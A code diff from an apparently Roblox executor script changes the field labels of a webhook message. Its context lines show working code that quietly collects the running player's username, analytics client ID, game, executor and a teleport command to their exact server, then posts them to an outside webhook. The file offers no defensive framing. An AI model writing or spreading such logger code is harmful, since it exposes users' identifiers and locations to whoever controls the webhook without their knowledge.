@@ -20,22 +20,22 @@ dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
 ["description"] = '```lua\ngame:GetService("TeleportService"):Teleport('..game.PlaceId..', "'..game.JobId..'", LocalPlayer)```',
 ["fields"] = {
     {
-      ["name"] = "*Username*",
+      ["name"] = "Username",
       ["value"] = "*" .. game.Players.LocalPlayer.Name .. "*",
       ["inline"] = true
     },
     {
-      ["name"] = "*ID*",
+      ["name"] = "ID",
       ["value"] = "*" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "*" ,
       ["inline"] = true
     },
     {
-      ["name"] = "*Game*",
+      ["name"] = "Game",
       ["value"] = "*" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "*",
       ["inline"] = true
     },
     {
-        ["name"] = "*Executor*",
+        ["name"] = "Executor",
         ["value"] = "*" .. loleh .. "*",
         ["inline"] = true
     },
@@ -45,7 +45,7 @@ dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
         ["inline"] = true
     },
     {
-        ["name"] = "*Loadstring*",
+        ["name"] = "Loadstring",
         ["value"] = "*" .. activewebhook2 .. "*",
         ["inline"] = true
     }},
